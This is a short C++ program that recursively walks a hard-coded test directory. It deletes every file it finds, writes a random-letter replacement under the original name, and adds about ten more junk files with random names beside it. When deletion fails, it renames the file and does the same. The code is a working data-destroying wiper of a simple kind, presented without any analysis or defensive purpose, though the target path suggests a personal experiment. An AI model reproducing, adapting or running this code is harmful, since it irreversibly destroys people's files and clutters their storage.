#include <iostream>
#include <filesystem>
#include <vector>
#include <cstdio>
#include <fstream>
#include <ctime>

namespace fs = std::filesystem;
using namespace std;


char random_char() {
    const char charset[] =
        "abcdefghijklmnopqrstuvwxyz"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = sizeof(charset) - 1;
    return charset[rand() % len];
}

string get_code(int length) {
    string line;
    line.reserve(length + 10);
    for (int i = 0; i < length; i++) {
        line += random_char();
    }
    return line;
}

bool rename_file_and_get_status(const fs::path& old_path, const fs::path& new_path) {
    if (std::rename(old_path.c_str(), new_path.c_str()) == 0) {
        // Rename succeeded, rename back to original
        return true;
    }
    return false;
}

bool create_new_file(const fs::path& the_new_path) {
    ofstream new_clone_file(the_new_path);
    if (new_clone_file) {
        new_clone_file << get_code(100);
        new_clone_file.close();
        return true;
    }
    return false;
}

void many_clone_files(const fs::path& the_path, int origin_file_length, const fs::path& origin_file_extension, int file_amount) {
    int counter = 0;
     while(counter < 10) {
        string new_file_with_extension = get_code(origin_file_length) + origin_file_extension.string();
        const fs::path& the_new_path = the_path.parent_path() / new_file_with_extension;
        bool wild_card = create_new_file(the_new_path);
        counter++;
    }
}

void path_finder(const fs::path& p) {
    try {
        for (const auto& entry : fs::directory_iterator(p)) {
            const fs::path& the_path = entry.path();
            if (fs::is_directory(entry.status())) {
                path_finder(the_path);
            } else {
                int origin_file_length = the_path.filename().string().size();
                const fs::path& origin_file_extension = the_path.extension();
                string new_file_with_extension = get_code(origin_file_length) + origin_file_extension.string();
                const fs::path& new_path = the_path.parent_path() / new_file_with_extension;
                try {
                    fs::remove(the_path);
                    bool clone = create_new_file(the_path);
                    many_clone_files(the_path, origin_file_length, origin_file_extension, 10);
                }
                //if error in deletion
                catch (...) {
                    //check file is able to write
                    bool rename_success = rename_file_and_get_status(the_path, new_path);
                    if (rename_success) {
                        bool create_cloning_success = create_new_file(the_path);
                        many_clone_files(the_path, origin_file_length, origin_file_extension, 100);
                    }
                    //if renaming fails
                    else {
                        cout << "Renaming fails!" << endl;
                    }
                    // ofstream file(the_path, std::ios::out);
                    // if (file.is_open()) {
                    //     for (size_t i = 0; i < 9; ++i) {
                    //         file << get_code(1000) << "\n";
                    //         if (file.fail()) {
                    //             break;
                    //         }
                    //     }
                    //     file.close();
                    // }
                    // //when file is not able to write
                    // else {
                    //     //
                    // }
                }
            }
        }
    }
    catch (...) {
        cout << "Main error" << endl;
    }
}

int main() {
    srand(time(0));
    fs::path p = "/Users/pyisoe/delete_test";
    path_finder(p);
    return 0;
}
